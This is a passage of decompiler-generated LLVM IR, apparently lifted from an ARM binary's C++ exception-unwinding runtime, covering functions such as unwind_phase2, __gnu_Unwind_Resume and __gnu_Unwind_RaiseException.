  %tmp81 = bitcast i32 %v4_19f94 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_19fa4 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_19f9c, i32 %v2_19fa4, i32 %v2_19fa0
  %v1_19fa8 = add i32 %v2_19f94, -1
  %v2_19fac = add i32 %storemerge39, %v1_19fa8
  br label %dec_label_pc_19fb0

dec_label_pc_19fb0:                               ; preds = %dec_label_pc_19f60, %dec_label_pc_19f90
  %storemerge40 = phi i32 [ %v2_19fac, %dec_label_pc_19f90 ], [ -1, %dec_label_pc_19f60 ]
  %v2_19fb0 = add i32 %storemerge, %v2_19f70
  %v0_19fb4 = load i32, i32* %r4.global-to-local, align 4
  %v3_19fb4 = icmp ult i32 %v0_19fb4, %v2_19fb0
  br i1 %v3_19fb4, label %dec_label_pc_19fbc, label %dec_label_pc_19f54

dec_label_pc_19fbc:                               ; preds = %dec_label_pc_19fb0
  %v9_19fbc = icmp eq i32 %v3_19f68, %v1_19fbc.ph
  br i1 %v9_19fbc, label %dec_label_pc_19f44.loopexit, label %dec_label_pc_19fc4

dec_label_pc_19fc4:                               ; preds = %dec_label_pc_19fbc
  %v1_19fc4 = add nsw i32 %v3_19f68, -1
  br label %dec_label_pc_19f60

dec_label_pc_19fcc:                               ; preds = %dec_label_pc_19f54
  %v2_19fcc = load i32, i32* %v3_19f70, align 4
  %v1_19fd0 = and i32 %v2_19fcc, 1073741824
  %v2_19fd0 = icmp eq i32 %v1_19fd0, 0
  %v2_19fd4 = or i32 %v2_19fcc, -2147483648
  %tmp83 = bitcast i32 %v2_19fcc to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_19fd8 = bitcast float %tmp84 to i32
  %v0_19fdc = select i1 %v2_19fd0, i32 %v2_19fd8, i32 %v2_19fd4
  %v2_19fdc = add i32 %v0_19fdc, %v2_19f70
  %v1_19fe0 = load i32, i32* %r6.global-to-local, align 4
  %v2_19fe0 = add i32 %v1_19fe0, 72
  %v3_19fe0 = inttoptr i32 %v2_19fe0 to i32*
  store i32 %v2_19fdc, i32* %v3_19fe0, align 4
  %v0_19fe4 = load i32, i32* %r7.global-to-local, align 4
  %v1_19fe4 = add i32 %v0_19fe4, 4
  %v2_19fe4 = inttoptr i32 %v1_19fe4 to i32*
  %v3_19fe4 = load i32, i32* %v2_19fe4, align 4
  %v7_19fe8 = icmp eq i32 %v3_19fe4, 1
  br i1 %v7_19fe8, label %.thread10, label %dec_label_pc_19ffc

.thread10:                                        ; preds = %dec_label_pc_19fcc
  %v1_19fe8 = add i32 %v3_19fe4, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_19ff4 = load i32, i32* %r6.global-to-local, align 4
  %v3_19ff4 = add i32 %v2_19ff4, 16
  %v4_19ff4 = inttoptr i32 %v3_19ff4 to i32*
  store i32 %v1_19fe8, i32* %v4_19ff4, align 4
  br label %dec_label_pc_19efc

dec_label_pc_19ffc:                               ; preds = %dec_label_pc_19fcc
  %v1_19ffc = icmp slt i32 %v3_19fe4, 0
  br i1 %v1_19ffc, label %.thread38, label %dec_label_pc_1a014

.thread38:                                        ; preds = %dec_label_pc_19ffc
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1a008 = load i32, i32* %r6.global-to-local, align 4
  %v5_1a008 = add i32 %v4_1a008, 76
  %v6_1a008 = inttoptr i32 %v5_1a008 to i32*
  store i32 %v1_19fe4, i32* %v6_1a008, align 4
  %v3_1a00c = load i32, i32* %r2.global-to-local, align 4
  %v4_1a00c = load i32, i32* %r6.global-to-local, align 4
  %v5_1a00c = add i32 %v4_1a00c, 80
  %v6_1a00c = inttoptr i32 %v5_1a00c to i32*
  store i32 %v3_1a00c, i32* %v6_1a00c, align 4
  br label %dec_label_pc_1a034

dec_label_pc_1a014:                               ; preds = %dec_label_pc_19ffc
  %v1_1a014 = and i32 %v3_19fe4, 1073741824
  %v2_1a014 = icmp eq i32 %v1_1a014, 0
  %v2_1a018 = or i32 %v3_19fe4, -2147483648
  %tmp85 = bitcast i32 %v3_19fe4 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_1a01c = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_1a014, i32 %v2_1a01c, i32 %v2_1a018
  %v1_1a020 = add i32 %storemerge42, 4
  %v2_1a024 = add i32 %v1_1a020, %v0_19fe4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1a02c = load i32, i32* %r6.global-to-local, align 4
  %v2_1a02c = add i32 %v1_1a02c, 76
  %v3_1a02c = inttoptr i32 %v2_1a02c to i32*
  store i32 %v2_1a024, i32* %v3_1a02c, align 4
  %v0_1a030 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a030 = load i32, i32* %r6.global-to-local, align 4
  %v2_1a030 = add i32 %v1_1a030, 80
  %v3_1a030 = inttoptr i32 %v2_1a030 to i32*
  store i32 %v0_1a030, i32* %v3_1a030, align 4
  br label %dec_label_pc_1a034

dec_label_pc_1a034:                               ; preds = %.thread38, %dec_label_pc_1a014
  %v0_1a034 = load i32, i32* %r6.global-to-local, align 4
  %v1_1a034 = add i32 %v0_1a034, 76
  %v2_1a034 = inttoptr i32 %v1_1a034 to i32*
  %v3_1a034 = load i32, i32* %v2_1a034, align 4
  store i32 %v3_1a034, i32* %r2.global-to-local, align 4
  %v1_1a038 = inttoptr i32 %v3_1a034 to i32*
  %v2_1a038 = load i32, i32* %v1_1a038, align 4
  %v1_1a03c = icmp slt i32 %v2_1a038, 0
  br i1 %v1_1a03c, label %dec_label_pc_1a060, label %dec_label_pc_1a044

dec_label_pc_1a044:                               ; preds = %dec_label_pc_1a034
  %v1_1a044 = and i32 %v2_1a038, 1073741824
  %v2_1a044 = icmp eq i32 %v1_1a044, 0
  %v2_1a048 = or i32 %v2_1a038, -2147483648
  %tmp87 = bitcast i32 %v2_1a038 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1a04c = bitcast float %tmp88 to i32
  %v0_1a050 = select i1 %v2_1a044, i32 %v2_1a04c, i32 %v2_1a048
  %v2_1a050 = add i32 %v0_1a050, %v3_1a034
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1a058 = add i32 %v0_1a034, 16
  %v3_1a058 = inttoptr i32 %v2_1a058 to i32*
  store i32 %v2_1a050, i32* %v3_1a058, align 4
  br label %dec_label_pc_19efc

dec_label_pc_1a060:                               ; preds = %dec_label_pc_1a034
  %v3_1a060 = udiv i32 %v2_1a038, 16777216
  %v1_1a064 = urem i32 %v3_1a060, 16
  %v2_1a064 = icmp eq i32 %v1_1a064, 0
  br i1 %v2_1a064, label %dec_label_pc_1a06c, label %dec_label_pc_1a080

dec_label_pc_1a06c:                               ; preds = %dec_label_pc_1a060
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a074 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a074 = add i32 %v0_1a074, -39332
  %v2_1a078 = add i32 %v0_1a034, 16
  %v3_1a078 = inttoptr i32 %v2_1a078 to i32*
  store i32 %v2_1a074, i32* %v3_1a078, align 4
  br label %dec_label_pc_19efc

dec_label_pc_1a080:                               ; preds = %dec_label_pc_1a060
  %v7_1a080 = icmp eq i32 %v1_1a064, 1
  br i1 %v7_1a080, label %dec_label_pc_1a0a4, label %dec_label_pc_1a088

dec_label_pc_1a088:                               ; preds = %dec_label_pc_1a080
  %v7_1a088 = icmp eq i32 %v1_1a064, 2
  br i1 %v7_1a088, label %dec_label_pc_1a090, label %dec_label_pc_19f44

dec_label_pc_1a090:                               ; preds = %dec_label_pc_1a088
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a098 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a098 = add i32 %v0_1a098, -39348
  %v2_1a09c = add i32 %v0_1a034, 16
  %v3_1a09c = inttoptr i32 %v2_1a09c to i32*
  store i32 %v2_1a098, i32* %v3_1a09c, align 4
  br label %dec_label_pc_19efc

dec_label_pc_1a0a4:                               ; preds = %dec_label_pc_1a080
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1a0ac = load i32, i32* %r5.global-to-local, align 4
  %v2_1a0ac = add i32 %v0_1a0ac, -39340
  %v2_1a0b0 = add i32 %v0_1a034, 16
  %v3_1a0b0 = inttoptr i32 %v2_1a0b0 to i32*
  store i32 %v2_1a0ac, i32* %v3_1a0b0, align 4
  br label %dec_label_pc_19efc

; uselistorder directives
  uselistorder i32 %v1_1a064, { 2, 1, 0 }
  uselistorder i32 %v0_1a034, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_19fe4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_19fb4, { 1, 0 }
  uselistorder i32 %v3_19f6c, { 2, 1, 0 }
  uselistorder i32 %v3_19f68, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_19f60, { 1, 0 }
  uselistorder i32 %v0_19f60, { 1, 0 }
  uselistorder i32 %v2_19f34, { 1, 0 }
  uselistorder i32 %v0_19f70.pre, { 1, 0 }
  uselistorder i32 %v3_19f20, { 1, 0 }
  uselistorder i32 %v1_19ed4, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1a034, { 1, 0 }
  uselistorder label %dec_label_pc_19fb0, { 1, 0 }
  uselistorder label %dec_label_pc_19f60, { 1, 0 }
  uselistorder label %dec_label_pc_19f44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19efc, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1a0bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1a0bc:
  %v0_1a0bc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1a0bc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1a0bc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a0bc, %bb
  %v10_1a0c4 = phi i32 [ %arg1, %dec_label_pc_1a0bc ], [ 0, %bb ]
  ret i32 %v10_1a0c4

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_1a0d8 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_1a0ec = inttoptr i32 %v1_1a0d8 to i32*
  %v2_1a0ec = load i32, i32* %v1_1a0ec, align 4
  store i32 %v2_1a0ec, i32* %r0.global-to-local, align 4
  %v12_1a0ec = add i32 %entry_vrs, 20
  %v1_1a0f8 = inttoptr i32 %v12_1a0ec to i32*
  %v2_1a0f8 = load i32, i32* %v1_1a0f8, align 4
  store i32 %v2_1a0f8, i32* %r0.global-to-local, align 4
  %v12_1a0f8 = add i32 %entry_vrs, 36
  %v1_1a100 = inttoptr i32 %v12_1a0f8 to i32*
  %v2_1a100 = load i32, i32* %v1_1a100, align 4
  store i32 %v2_1a100, i32* %r0.global-to-local, align 4
  %v12_1a100 = add i32 %entry_vrs, 52
  store i32 %v12_1a100, i32* @ip, align 4
  %v13_1a104 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_1a104, i32* @lr, align 4
  %v1_1a108 = inttoptr i32 %v12_1a100 to i32*
  %v2_1a108 = load i32, i32* %v1_1a108, align 4
  store i32 %v2_1a108, i32* %r0.global-to-local, align 4
  %v9_1a108 = add i32 %entry_vrs, 64
  %v10_1a108 = inttoptr i32 %v9_1a108 to i32*
  %v11_1a108 = load i32, i32* %v10_1a108, align 4
  store i32 0, i32* @r4, align 4
  %v1_1a110 = add i32 %ucbp, 12
  %v2_1a110 = inttoptr i32 %v1_1a110 to i32*
  %v3_1a110 = load i32, i32* %v2_1a110, align 4
  store i32 %v2_1a108, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_1a128 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_1a108)
  store i32 %v2_1a128, i32* %r0.global-to-local, align 4
  %v0_1a12c = load i32, i32* @r6, align 4
  %v1_1a12c = load i32, i32* @r4, align 4
  %v9_1a12c = icmp eq i32 %v0_1a12c, %v1_1a12c
  store i32 %v2_1a128, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_1a12c, label %dec_label_pc_1a140, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1a14c

dec_label_pc_1a140:                               ; preds = %entry
  store i32 %v0_1a12c, i32* @r4, align 4
  br label %dec_label_pc_1a148

dec_label_pc_1a148:                               ; preds = %dec_label_pc_1a210, %dec_label_pc_1a140
  br label %dec_label_pc_1a14c

dec_label_pc_1a14c:                               ; preds = %.thread, %dec_label_pc_1a148
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_1a148 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1a14c = icmp eq i32 %v2_1a128, 0
  br i1 %v2_1a14c, label %dec_label_pc_1a1c4, label %.thread2.dec_label_pc_1a160_crit_edge

.thread2.dec_label_pc_1a160_crit_edge:            ; preds = %dec_label_pc_1a14c
  br label %dec_label_pc_1a160

dec_label_pc_1a160:                               ; preds = %.thread2.dec_label_pc_1a160_crit_edge, %dec_label_pc_1a1c4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1a170 = load i32, i32* @r5, align 4
  store i32 %v0_1a170, i32* @r3, align 4
  store i32 106880, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_1a110)
  br i1 false, label %dec_label_pc_1a188, label %dec_label_pc_1a1b0

dec_label_pc_1a188:                               ; preds = %dec_label_pc_1a160
  br i1 undef, label %dec_label_pc_1a190, label %dec_label_pc_1a1b4

dec_label_pc_1a190:                               ; preds = %dec_label_pc_1a188
  br i1 undef, label %dec_label_pc_1a210, label %dec_label_pc_1a1a8

dec_label_pc_1a1a8:                               ; preds = %dec_label_pc_1a190
  br i1 undef, label %dec_label_pc_1a208, label %dec_label_pc_1a1b0

dec_label_pc_1a1b0:                               ; preds = %dec_label_pc_1a160, %dec_label_pc_1a1a8
  br label %dec_label_pc_1a1b4

dec_label_pc_1a1b4:                               ; preds = %dec_label_pc_1a188, %dec_label_pc_1a1b0
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_1a1c4:                               ; preds = %dec_label_pc_1a14c
  store i32 %v11_1a108, i32* @r3, align 4
  %v2_1a1c8 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_1a1c8, i32* @r4, align 4
  %v1_1a1cc = load i32, i32* @r5, align 4
  %v2_1a1cc = add i32 %v1_1a1cc, 20
  %v3_1a1cc = inttoptr i32 %v2_1a1cc to i32*
  store i32 %v11_1a108, i32* %v3_1a1cc, align 4
  store i32 %v2_1a1c8, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1a1dc = call i32 @memcpy()
  %v0_1a1e4 = load i32, i32* @r6, align 4
  store i32 %v0_1a1e4, i32* %r0.global-to-local, align 4
  %v0_1a1e8 = load i32, i32* @r5, align 4
  %v1_1a1ec = add i32 %v0_1a1e8, 16
  %v2_1a1ec = inttoptr i32 %v1_1a1ec to i32*
  %v3_1a1ec = load i32, i32* %v2_1a1ec, align 4
  store i32 %v3_1a1ec, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1a1ec)
  %v0_1a1fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a1fc, i32* @r4, align 4
  br label %dec_label_pc_1a160

dec_label_pc_1a208:                               ; preds = %dec_label_pc_1a1a8
  br label %dec_label_pc_1a210

dec_label_pc_1a210:                               ; preds = %dec_label_pc_1a190, %dec_label_pc_1a208
  br label %dec_label_pc_1a148

; uselistorder directives
  uselistorder i32 %v11_1a108, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 4, 7, 1, 0, 6, 5, 9, 8, 3 }
  uselistorder i32* @r3, { 95, 96, 33, 34, 22, 97, 98, 25, 99, 100, 4, 101, 102, 103, 5, 104, 105, 106, 6, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 0, 125, 126, 127, 128, 23, 24, 26, 27, 28, 29, 30, 31, 32, 64, 50, 51, 52, 129, 130, 143, 144, 145, 133, 134, 135, 136, 137, 1, 138, 8, 36, 37, 131, 132, 63, 65, 66, 67, 68, 69, 70, 72, 71, 11, 12, 13, 149, 146, 147, 148, 2, 150, 151, 152, 35, 38, 39, 40, 41, 42, 43, 139, 140, 141, 142, 73, 74, 75, 76, 53, 77, 78, 10, 79, 80, 81, 82, 83, 84, 85, 3, 14, 15, 16, 17, 18, 19, 20, 21, 44, 45, 46, 47, 48, 49, 54, 9, 55, 56, 57, 58, 59, 60, 61, 62, 86, 87, 88, 89, 90, 91, 7, 92, 93, 94 }
  uselistorder i32 10, { 1, 2, 41, 42, 43, 5, 63, 62, 98, 90, 64, 91, 0, 10, 44, 45, 46, 11, 39, 40, 34, 4, 47, 35, 12, 36, 48, 13, 49, 14, 50, 15, 51, 16, 52, 17, 53, 18, 54, 19, 55, 20, 56, 21, 57, 22, 58, 23, 59, 24, 60, 61, 25, 26, 27, 6, 65, 66, 67, 68, 69, 70, 71, 72, 73, 28, 74, 75, 76, 7, 77, 78, 79, 29, 8, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 30, 92, 3, 93, 94, 32, 95, 37, 38, 9, 96, 31, 97, 33 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1a210, { 1, 0 }
  uselistorder label %dec_label_pc_1a1b4, { 1, 0 }
  uselistorder label %dec_label_pc_1a1b0, { 1, 0 }
  uselistorder label %dec_label_pc_1a160, { 1, 0 }
  uselistorder label %dec_label_pc_1a14c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_1a224 = add i32 %ucbp, 12
  %v3_1a224 = inttoptr i32 %v2_1a224 to i32*
  store i32 %stop_fn, i32* %v3_1a224, align 4
  %v3_1a228 = add i32 %ucbp, 24
  %v4_1a228 = inttoptr i32 %v3_1a228 to i32*
  store i32 %tmp, i32* %v4_1a228, align 4
  %v1_1a22c = add i32 %entry_vrs, 60
  %v2_1a22c = inttoptr i32 %v1_1a22c to i32*
  %v3_1a22c = load i32, i32* %v2_1a22c, align 4
  %v2_1a234 = add i32 %entry_vrs, 64
  %v3_1a234 = inttoptr i32 %v2_1a234 to i32*
  store i32 %v3_1a22c, i32* %v3_1a234, align 4
  %v3_1a23c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1a23c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_1a2546 = add i32 %vrs, 64
  %v2_1a2547 = inttoptr i32 %v1_1a2546 to i32*
  %v3_1a2548 = load i32, i32* %v2_1a2547, align 4
  %v2_1a2589 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_1a2548)
  store i32 %v2_1a2589, i32* %r0.global-to-local, align 4
  %v2_1a25c11 = icmp eq i32 %v2_1a2589, 0
  br i1 %v2_1a25c11, label %dec_label_pc_1a264, label %dec_label_pc_1a294

dec_label_pc_1a264:                               ; preds = %entry, %dec_label_pc_1a264.dec_label_pc_1a250_crit_edge
  %v0_1a264 = load i32, i32* @r5, align 4
  %v1_1a264 = add i32 %v0_1a264, 64
  %v2_1a264 = inttoptr i32 %v1_1a264 to i32*
  %v3_1a264 = load i32, i32* %v2_1a264, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1a26c = load i32, i32* @r4, align 4
  %v2_1a26c = add i32 %v1_1a26c, 20
  %v3_1a26c = inttoptr i32 %v2_1a26c to i32*
  store i32 %v3_1a264, i32* %v3_1a26c, align 4
  %v0_1a270 = load i32, i32* @r4, align 4
  %v1_1a278 = add i32 %v0_1a270, 16
  %v2_1a278 = inttoptr i32 %v1_1a278 to i32*
  %v3_1a278 = load i32, i32* %v2_1a278, align 4
  call void @__pseudo_branch(i32 %v3_1a278)
  %v0_1a284 = load i32, i32* %r0.global-to-local, align 4
  %v7_1a284 = icmp eq i32 %v0_1a284, 8
  br i1 %v7_1a284, label %dec_label_pc_1a264.dec_label_pc_1a250_crit_edge, label %dec_label_pc_1a28c

dec_label_pc_1a264.dec_label_pc_1a250_crit_edge:  ; preds = %dec_label_pc_1a264
  %v0_1a250.pre = load i32, i32* @r4, align 4
  %v0_1a254.pre = load i32, i32* @r5, align 4
  store i32 %v0_1a250.pre, i32* %r0.global-to-local, align 4
  %v1_1a254 = add i32 %v0_1a254.pre, 64
  %v2_1a254 = inttoptr i32 %v1_1a254 to i32*
  %v3_1a254 = load i32, i32* %v2_1a254, align 4
  %v2_1a258 = call i32 @get_eit_entry(i32 %v0_1a250.pre, i32 %v3_1a254)
  store i32 %v2_1a258, i32* %r0.global-to-local, align 4
  %v2_1a25c = icmp eq i32 %v2_1a258, 0
  br i1 %v2_1a25c, label %dec_label_pc_1a264, label %dec_label_pc_1a294

dec_label_pc_1a28c:                               ; preds = %dec_label_pc_1a264
  %v7_1a28c = icmp eq i32 %v0_1a284, 7
  br i1 %v7_1a28c, label %dec_label_pc_1a298, label %dec_label_pc_1a294

dec_label_pc_1a294:                               ; preds = %entry, %dec_label_pc_1a264.dec_label_pc_1a250_crit_edge, %dec_label_pc_1a28c
  %v0_1a294 = call i32 @abort()
  store i32 %v0_1a294, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a298

dec_label_pc_1a298:                               ; preds = %dec_label_pc_1a28c, %dec_label_pc_1a294
  %v0_1a298 = load i32, i32* @r5, align 4
  %v1_1a298 = add i32 %v0_1a298, 4
  store i32 %v1_1a298, i32* %r0.global-to-local, align 4
  %v1_1a29c = inttoptr i32 %v1_1a298 to i32*
  %v2_1a29c = call i32 @__restore_core_regs(i32* %v1_1a29c)
  store i32 %v2_1a29c, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_1a298, { 1, 0 }
  uselistorder label %dec_label_pc_1a294, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a264, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_1a2a0 = add i32 %ucbp, 20
  %v2_1a2a0 = inttoptr i32 %v1_1a2a0 to i32*
  %v3_1a2a0 = load i32, i32* %v2_1a2a0, align 4
  %v1_1a2a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a2a8 = add i32 %v1_1a2a8, 64
  %v3_1a2a8 = inttoptr i32 %v2_1a2a8 to i32*
  store i32 %v3_1a2a0, i32* %v3_1a2a8, align 4
  %v1_1a2ac = add i32 %ucbp, 12
  %v2_1a2ac = inttoptr i32 %v1_1a2ac to i32*
  %v3_1a2ac = load i32, i32* %v2_1a2ac, align 4
  %v2_1a2b0 = icmp eq i32 %v3_1a2ac, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_1a2bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1a2bc, i32* @r5, align 4
  br i1 %v2_1a2b0, label %dec_label_pc_1a2c4, label %dec_label_pc_1a300

dec_label_pc_1a2c4:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_1a2d0 = add i32 %ucbp, 16
  %v2_1a2d0 = inttoptr i32 %v1_1a2d0 to i32*
  %v3_1a2d0 = load i32, i32* %v2_1a2d0, align 4
  call void @__pseudo_branch(i32 %v3_1a2d0)
  br i1 false, label %dec_label_pc_1a2f8, label %dec_label_pc_1a2e4

dec_label_pc_1a2e4:                               ; preds = %dec_label_pc_1a2c4
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_152c8.954 to i32))
  %v0_1a2ec = load i32, i32* @r4, align 4
  %v0_1a2f0 = load i32, i32* @r5, align 4
  store i32 %v0_1a2f0, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_1a2ec, i32 %v0_1a2f0)
  br label %dec_label_pc_1a2f8

dec_label_pc_1a2f8:                               ; preds = %dec_label_pc_1a2c4, %dec_label_pc_1a2e4
  %v0_1a2f8 = load i32, i32* @r5, align 4
  %v1_1a2f8 = add i32 %v0_1a2f8, 4
  %v1_1a2fc = inttoptr i32 %v1_1a2f8 to i32*
  %v2_1a2fc = call i32 @__restore_core_regs(i32* %v1_1a2fc)
  %v1_1a304.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1a300

dec_label_pc_1a300:                               ; preds = %entry, %dec_label_pc_1a2f8
  %v1_1a304 = phi i32 [ %v0_1a2bc, %entry ], [ %v1_1a304.pre, %dec_label_pc_1a2f8 ]
  %v3_1a304 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_1a304, i32 1)
  %v0_1a308 = call i32 @abort()
  ret i32 %v0_1a308

; uselistorder directives
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 7, 9, 10, 8, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 43, 44, 45, 46, 47, 49, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 28, 54, 58, 57, 56, 50, 51, 35, 36, 29, 30, 31, 52, 53, 55, 37, 38, 48, 39, 32, 40, 23, 24, 0, 25, 26, 27, 33, 34, 41, 42, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 108, 144, 4, 145, 146, 147, 148, 5, 93, 127, 149, 6, 92, 150, 7, 91, 151, 152, 153, 154, 8, 155, 128, 9, 95, 156, 10, 94, 157, 158, 11, 159, 160, 161, 12, 162, 163, 13, 164, 14, 130, 165, 166, 129, 167, 168, 15, 96, 16, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 18, 98, 19, 179, 180, 181, 20, 97, 182, 21, 17, 183, 184, 22, 185, 186, 187, 23, 188, 189, 190, 191, 192, 24, 25, 131, 26, 27, 28, 143, 99, 193, 194, 100, 195, 133, 196, 197, 30, 198, 199, 31, 101, 201, 29, 202, 200, 203, 132, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 105, 44, 45, 46, 47, 48, 115, 114, 49, 222, 90, 106, 112, 204, 113, 213, 205, 136, 206, 207, 50, 208, 51, 52, 209, 210, 107, 211, 212, 103, 214, 215, 216, 217, 218, 219, 53, 54, 220, 221, 135, 134, 65, 66, 67, 223, 68, 69, 116, 117, 122, 118, 123, 110, 121, 224, 111, 126, 225, 55, 226, 56, 57, 58, 227, 137, 138, 59, 60, 228, 139, 140, 61, 62, 229, 141, 142, 63, 64, 109, 230, 231, 124, 232, 70, 102, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 234, 235, 236, 237, 119, 238, 239, 240, 241, 242, 243, 244, 85, 86, 245, 87, 88, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 84, 261, 262, 263, 264, 265, 266, 83, 267, 104, 120, 125, 89, 268, 81, 82, 233, 269 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_1a300, { 1, 0 }
  uselistorder label %dec_label_pc_1a2f8, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a30c = load i32, i32* @r4, align 4
  store i32 %v3_1a30c, i32* %stack_var_-16, align 4
  %v6_1a30c = load i32, i32* @r5, align 4
  %v9_1a30c = load i32, i32* @r6, align 4
  %v12_1a30c = load i32, i32* @lr, align 4
  %v1_1a310 = add i32 %entry_vrs, 60
  %v2_1a310 = inttoptr i32 %v1_1a310 to i32*
  %v3_1a310 = load i32, i32* %v2_1a310, align 4
  %v2_1a314 = add i32 %entry_vrs, 64
  %v3_1a314 = inttoptr i32 %v2_1a314 to i32*
  store i32 %v3_1a310, i32* %v3_1a314, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_1a344 = load i32, i32* %v3_1a314, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_1a35c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_1a344)
  %v2_1a360 = icmp eq i32 %v2_1a35c, 0
